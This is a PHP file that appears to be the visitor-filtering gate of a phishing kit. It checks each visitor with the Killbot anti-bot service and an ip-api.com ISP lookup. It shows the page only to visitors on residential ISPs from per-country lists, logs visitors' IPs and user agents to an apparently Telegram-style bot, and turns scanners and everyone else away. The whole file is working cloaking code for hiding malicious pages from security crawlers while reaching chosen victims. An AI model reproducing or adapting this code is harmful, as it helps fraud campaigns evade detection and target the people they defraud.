<?php
require 'config.php';
$isp_luxembourg = array("Alternet", "Cegecom", "Coditel", "CrossComm", "Eltrona", "Freenet", "Luxembourg Online", "Luxweb", "Netline", "Tele2", "Visual Online", "VOXmobile", "Eltrona Interdiffusion", "FranTech Solutions", "G-Core Labs", "Luxembourg Online", "M247 Ltd", "Mixvoip", "POST Luxembourg", "Proximus Luxembourg", "Telkea Telecom SA", "Visual Online");
$isp_swiss = array("sincom", "sunrise", "swisscom", "upc");
$isp_italy = array("EOLO", "Fastweb", "Iliad", "Sky Italia", "Telecom Italia", "Tiscali", "Vodafone", "Wind");
$isp_uea = array("Integrated Telecommunications", "Cygnus", "Etisalat", "Virgin", "Oger", "Xfinity", "belnet");
$isp_ireland = array("Adelphi Net1 Ltd", "Eir Broadband", "Eir Mobile", "M2 Ltd", "Sky", "Three Ireland", "Virgin Media Ireland", "Vodafone Ireland", "3", "Access Telecom", "AirSpeed Communications", "BT Communications", "Eircom", "HomeVision", "Internet Service Providers Associat", "Ireland On-Line", "NTL Ireland", "Perlico", "Pure Telecom");
$config['bot'] = $antibotRedirect;
$isp_deutschland = array("1and1", "1&1", "Antec", "congstar", "glasfaser", "DOKOM", "easybell", "EWE", "EWR", "Fiete", "Filiago", "fonial", "Htp", "cologne", "PYUR", "Unitymedia", "wilhelm", "Arcor", "Claranet", "Deutsche Telekom", "Freenet", "HanseNet", "m-net", "O2", "QSC", "Strato");
$isp_sweden = array("Algonet", "bahnof", "bredbandbolaget", "com hem", "glocalnet", "dataphone", "prq", "serious tubes networks", "tele2", "telenor", "telenordia", "teliasonera");
$ip = $_SERVER['REMOTE_ADDR'];
$isp_france = array("bouygues", "orange", "free", "sfr", "neuf", "cegetel", "altice", "wanadoo", "france telecom");
require 'Killbot.php';
$isp_spain = array("Avatel Telecom", "Digi Spain", "Jazztel", "M7 Ltd", "Orange Espana", "Procono S.A.", "Telefonica de Espana", "Telefonica de Espana Static IP", "Vodafone Spain", "Yoigo", "Euskaltel", "Orange", "Tele2", "Telecable");
$isp_portugal = array("AR Telecom", "Bragatel", "Broadnet Portugal", "Cabo TV Madeirense", "Cabovisão", "Claranet Portugal", "COLT Telecom", "Fleximédia", "Meo", "NFSI Telecom", "Nortenet", "NOS", "Optimus Clix", "SAPO", "TVTEL", "Vodafone Portugal");
$isp_usa = array("AT&T", "Verizon", "Xfinity", "Cox", "Spectrum", "Mediacom", "Astound", "CenturyLink", "Frontier", "HughesNet", "Optimum", "Viasat", "Suddenlink");
if (strlen($test_ip) > 1) {
    $ip = $test_ip;
}
$display = false;
$config["apikey"] = $antibotToken;
if($_SERVER['REMOTE_ADDR'] == $whitelist_ip){
    $display = true;
}
$isp_canada = array("Aurora Cable Internet", "Bell Aliant", "Bell Internet", "Cable Axion", "Cablevision", "Chebucto Community Net", "Cogeco", "Colbanet", "Craig Wireless", "Dery Telecom", "Eastlink (company)", "Electronic Box", "Everus Communications", "Guest-tek", "Information Gateway Serv", "Internex Online", "Inukshuk Wireless", "Jet2.net", "Look Communications", "Managed Network Systems,", "Mount", "National Capital FreeNe", "Novus Entertainment", "Ontera", "OXIO", "Persona Communications", "Primus Canada", "Project Chapleau", "Qiniq", "Rogers Hi-Speed Internet", "Rose Media", "Rush", "SaskTel", "Seaside Communications", "Source Cable", "SSI Micro", "TAO", "TekSavvy", "Telus", "Telus Internet", "Vidéotron", "Vmedia", "Web Community Resource", "Wireless Nomad", "YourLink");
$isp_belgium = array("orange", "telenet", "proximus", "belgacom", "clearwire", "planet internet", "belnet");
$isp_austria = array("Austria GmbH", "A1 Telekom", "Datacamp", "Hutchison", "Liwest", "M247", "Magenta", "Salzburg", "Voxility", "Zscaler");
$isp_danish = array("comx", "cybercity", "fullrate", "TDC", "Tele2", "Telenor", "Telia", "Sonera");
$isp_netherlands = array("casema", "claranet", "hacktic", "KPNQwest", "NLnet", "Planet", "SURF", "UPC", "XS4ALL", "Ziggo");
$isp_UK = array("Andrews and Arnold", "AOL Broadband", "BT Consumer", "BT Group", "BT Infinity", "BT Total Broadband", "BT Wholesale", "Colt Group S.A.", "Daisy Group", "Daisy Wholesale", "Demon Internet", "Easynet Connect", "Eclipse Internet", "Heart Internet", "KCOM Group", "Manchester Host", "Origin Broadband", "Planet Online", "Sky Broadband", "Supanet Limited", "TalkTalk Business", "TalkTalk Group", "The Cloud (company)", "The Phone Co-op", "UTV Internet", "Virgin Media", "X-Stream Networ", "BT", "EE", "Plusnet", "Sky Broadband", "TalkTalk", "Telefonica O2 UK", "Three", "Virgin Media", "Vodafone", "Vodafone UK");



function checkISP($list, $org, $visitor_ip, $botToken, $chat_ID, $log_bot){
    $compteur = 0;
    $result = false;
    while ($compteur < count($list)){
        if (strpos(strtolower($org), strtolower($list[$compteur]))) {
            $result = true;
            break;
        }
        $compteur++;
    }
    if ($result){
        logBot(true, $visitor_ip, $botToken, $chat_ID, $log_bot, false, $_SERVER['HTTP_USER_AGENT']);
    }
    return $result;
}

if ($_SERVER['REMOTE_ADDR'] != $whitelist_ip) {
    $Killbot = new Killbot();
    $Killbot->apikey($config['apikey']);
    if ($killbot_active == true && $Killbot->check() == true){
        logBot(false, $ip, $botToken, $chatID, $log_bot, true, $_SERVER['HTTP_USER_AGENT']);
        die("location : ".$config['bot']);
    } else {
        if ($disable_isp == false){
            function getIpInfo2($ip = ''){
                $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
                $ip_info_json = json_decode($ipinfo, true);
                return $ip_info_json;
            }
            $visitor_ip = $_SERVER['REMOTE_ADDR'];
            if (strlen($test_ip) > 1){
                $visitor_ip = $test_ip;
            }
            $ipinfo_json = getIpInfo2($visitor_ip);
            if ($ipinfo_json['status'] != "fail"){
                $org = "{$ipinfo_json['as']}";
                $isps = "{$ipinfo_json['isp']}";
            } else {
                $org = "Introuvable";
                $isps = "Introuvable";
            }
            if (!$display && $isp_italy_check) {
                $display = checkISP($isp_italy, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_austria_check){
                $display = checkISP($isp_austria, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_swiss_check) {
                $display = checkISP($isp_swiss, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_netherlands_check){
                $display = checkISP($isp_netherlands, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_deutschland_check){
                $display = checkISP($isp_deutschland, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_danish_check){
                $display = checkISP($isp_danish, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_sweden_check){
                $display = checkISP($isp_sweden, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_canada_check){
                $display = checkISP($isp_canada, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_france_check){
                $display = checkISP($isp_france, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_portugal_check){
                $display = checkISP($isp_portugal, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_luxembourg_check){
                $display = checkISP($isp_luxembourg, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_spain_check){
                $display = checkISP($isp_spain, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_ireland_check){
                $display = checkISP($isp_ireland, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_UK_check){
                $display = checkISP($isp_UK, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_belgium_check){
                $display = checkISP($isp_belgium, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_usa_check){
                $display = checkISP($isp_usa, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if (!$display && $isp_uea_check){
                $display = checkISP($isp_uea, $org, $visitor_ip, $botToken, $chatID, $log_bot);
            }
            if ($display != true){
                logBot(false, $visitor_ip, $botToken, $chatID, $log_bot, false, $_SERVER['HTTP_USER_AGENT']);
                die("location: ".$config['bot']);
                exit();
            }
        }
    }
    logBot(true, $visitor_ip, $botToken, $chatID, $log_bot, false, $_SERVER['HTTP_USER_AGENT']);
}




?>